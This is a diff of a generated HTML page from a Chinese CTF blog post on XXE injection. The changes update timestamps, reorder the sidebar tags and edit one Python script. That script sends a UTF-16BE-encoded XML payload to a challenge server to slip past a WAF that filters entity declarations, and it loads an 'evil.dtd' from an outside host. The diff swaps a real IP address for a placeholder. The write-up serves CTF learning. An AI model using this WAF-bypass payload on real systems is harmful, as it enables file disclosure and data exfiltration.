@@ -18,7 +18,7 @@
 <meta property="og:description" content="基础知识：dtd，四种实体xxe 是 xml external entity，xml 外部实体注入，在叙述漏洞之前先来了解一下关于 xml 的基础知识。 xml 是一种数据格式，他允许使用者在文档头部定义要使用的变量，这部分区域就是 dtd（英文）在 dtd 里面把变量称呼为“实体”。 例如这个代码块中的就是 dtd 部分： 12345&lt;?xml version &#x3D;&quot;1">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-12-08T04:00:22.000Z">
-<meta property="article:modified_time" content="2025-12-08T04:00:48.327Z">
+<meta property="article:modified_time" content="2025-12-09T01:30:07.481Z">
 <meta property="article:author" content="温柔刀">
 <meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary">
@@ -287,7 +287,7 @@
 
                 <!-- 文章字数统计 -->
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1k</span>Reading time: <span class="post-count reading-time">4 min</span></span>
+                        <span>Word count: <span class="post-count word-count">995</span>Reading time: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
@@ -490,8 +490,7 @@
 
 <h3 id="过滤ETENTY"><a href="#过滤ETENTY" class="headerlink" title="过滤ETENTY"></a>过滤ETENTY</h3><p>可以执行 xml，但是过滤了&lt;!ENTITY</p>
 <p>那么写个脚本，把发过去的 xml 进行编码就行</p>
-<p>(这一部分我是直接复制的其实我不懂这个脚本在干什么)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.ilovectf.cn:30036/&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始 XML：仅负责引用远程 DTD</span></span><br><span class="line"><span class="comment"># encoding=&quot;UTF-16BE&quot; 声明必须与实际编码一致</span></span><br><span class="line">payload_str = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16BE&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://106.15.35.97:9999/evil.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root/&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键点1：转为 UTF-16BE 二进制流绕过 WAF</span></span><br><span class="line">payload_bytes = payload_str.encode(<span class="string">&#x27;utf-16be&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键点2：封装为表单数据 (application/x-www-form-urlencoded)</span></span><br><span class="line"><span class="comment"># requests 会自动对 bytes 进行 URL 编码</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;xmlInput&quot;</span>: payload_bytes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 ... Chrome/142.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Sending Payload...&quot;</span>)</span><br><span class="line">    res = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] Status: <span class="subst">&#123;res.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Response snippet:&quot;</span>, res.text[:<span class="number">100</span>])</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.ilovectf.cn:30036/&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始 XML：仅负责引用远程 DTD</span></span><br><span class="line"><span class="comment"># encoding=&quot;UTF-16BE&quot; 声明必须与实际编码一致</span></span><br><span class="line">payload_str = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16BE&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://ip:port/evil.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root/&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键点1：转为 UTF-16BE 二进制流绕过 WAF</span></span><br><span class="line">payload_bytes = payload_str.encode(<span class="string">&#x27;utf-16be&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键点2：封装为表单数据 (application/x-www-form-urlencoded)</span></span><br><span class="line"><span class="comment"># requests 会自动对 bytes 进行 URL 编码</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;xmlInput&quot;</span>: payload_bytes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 ... Chrome/142.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Sending Payload...&quot;</span>)</span><br><span class="line">    res = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] Status: <span class="subst">&#123;res.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Response snippet:&quot;</span>, res.text[:<span class="number">100</span>])</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
 
 
 
@@ -502,12 +501,16 @@
             <p>Author：<a href="http://example.com">温柔刀</a>
             <p>Link：<a href="http://example.com/2025/12/08/xxe/">http://example.com/2025/12/08/xxe/</a>
             <p>Publish date：<a href="http://example.com/2025/12/08/xxe/">December 8th 2025, 12:00:22 pm</a>
-            <p>Update date：<a href="http://example.com/2025/12/08/xxe/">December 8th 2025, 12:00:48 pm</a>
+            <p>Update date：<a href="http://example.com/2025/12/08/xxe/">December 9th 2025, 9:30:07 am</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     <!-- paginator -->
     <ul class="post-paginator">
         <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/12/16/%E6%88%98%E9%98%9F%E9%9D%A2%E8%AF%95%E4%B8%8E%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%E7%9A%84%E6%9E%84%E5%BB%BA/" title="战队面试与知识体系的构建">
+                    <div class="nextTitle">战队面试与知识体系的构建</div>
+                </a>
         </li>
         <li class="previous">
                 <div class="prevSlogan">Previous Post</div>
@@ -624,15 +627,20 @@
         
         
         
+        
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 25
+        Total : 26
         </div>
         <!-- search  -->
     </div>
     <div class="post-archive">
             <div class="archive-year"> 2025 </div>
             <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/16</span>
+            <a class="archive-post-title" href="/2025/12/16/%E6%88%98%E9%98%9F%E9%9D%A2%E8%AF%95%E4%B8%8E%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%E7%9A%84%E6%9E%84%E5%BB%BA/">战队面试与知识体系的构建</a>
+        </li>
         <li class="archive-post-item">
             <span class="archive-post-date">12/08</span>
             <a class="archive-post-title" href="/2025/12/08/xxe/">xxe</a>
@@ -663,11 +671,11 @@
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">07/28</span>
-            <a class="archive-post-title" href="/2025/07/28/Perl-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94-CSAWQual-2016-I-Got-ID/">Perl 文件上传—— [CSAWQual 2016]I_Got_ID</a>
+            <a class="archive-post-title" href="/2025/07/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/">SQL报错注入整理</a>
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">07/28</span>
-            <a class="archive-post-title" href="/2025/07/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/">SQL报错注入整理</a>
+            <a class="archive-post-title" href="/2025/07/28/Perl-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94-CSAWQual-2016-I-Got-ID/">Perl 文件上传—— [CSAWQual 2016]I_Got_ID</a>
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">07/28</span>
@@ -743,13 +751,13 @@
                 <span class="iconfont-archer">&#xe606;</span>
                 wp
             </span>
-            <span class="sidebar-tag-name" data-tags="Java">
-                <span class="iconfont-archer">&#xe606;</span>
-                Java
-            </span>
             <span class="sidebar-tag-name" data-tags="PHP原生类">
                 <span class="iconfont-archer">&#xe606;</span>
                 PHP原生类
+            </span>
+            <span class="sidebar-tag-name" data-tags="Java">
+                <span class="iconfont-archer">&#xe606;</span>
+                Java
             </span>
             <span class="sidebar-tag-name" data-tags="Nginx">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -771,6 +779,14 @@
                 <span class="iconfont-archer">&#xe606;</span>
                 无参
             </span>
+            <span class="sidebar-tag-name" data-tags="SOME">
+                <span class="iconfont-archer">&#xe606;</span>
+                SOME
+            </span>
+            <span class="sidebar-tag-name" data-tags="报错注入">
+                <span class="iconfont-archer">&#xe606;</span>
+                报错注入
+            </span>
             <span class="sidebar-tag-name" data-tags="Perl">
                 <span class="iconfont-archer">&#xe606;</span>
                 Perl
@@ -782,26 +798,6 @@
             <span class="sidebar-tag-name" data-tags="文件上传">
                 <span class="iconfont-archer">&#xe606;</span>
                 文件上传
-            </span>
-            <span class="sidebar-tag-name" data-tags="SOME">
-                <span class="iconfont-archer">&#xe606;</span>
-                SOME
-            </span>
-            <span class="sidebar-tag-name" data-tags="报错注入">
-                <span class="iconfont-archer">&#xe606;</span>
-                报错注入
-            </span>
-            <span class="sidebar-tag-name" data-tags="session">
-                <span class="iconfont-archer">&#xe606;</span>
-                session
-            </span>
-            <span class="sidebar-tag-name" data-tags="条件竞争">
-                <span class="iconfont-archer">&#xe606;</span>
-                条件竞争
-            </span>
-            <span class="sidebar-tag-name" data-tags="Tomcat">
-                <span class="iconfont-archer">&#xe606;</span>
-                Tomcat
             </span>
             <span class="sidebar-tag-name" data-tags="XSS">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -827,17 +823,29 @@
                 <span class="iconfont-archer">&#xe606;</span>
                 上传压缩包
             </span>
-            <span class="sidebar-tag-name" data-tags="json">
+            <span class="sidebar-tag-name" data-tags="Tomcat">
                 <span class="iconfont-archer">&#xe606;</span>
-                json
+                Tomcat
+            </span>
+            <span class="sidebar-tag-name" data-tags="session">
+                <span class="iconfont-archer">&#xe606;</span>
+                session
+            </span>
+            <span class="sidebar-tag-name" data-tags="条件竞争">
+                <span class="iconfont-archer">&#xe606;</span>
+                条件竞争
+            </span>
+            <span class="sidebar-tag-name" data-tags="DNS">
+                <span class="iconfont-archer">&#xe606;</span>
+                DNS
             </span>
             <span class="sidebar-tag-name" data-tags="xxe">
                 <span class="iconfont-archer">&#xe606;</span>
                 xxe
             </span>
-            <span class="sidebar-tag-name" data-tags="DNS">
+            <span class="sidebar-tag-name" data-tags="json">
                 <span class="iconfont-archer">&#xe606;</span>
-                DNS
+                json
             </span>
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
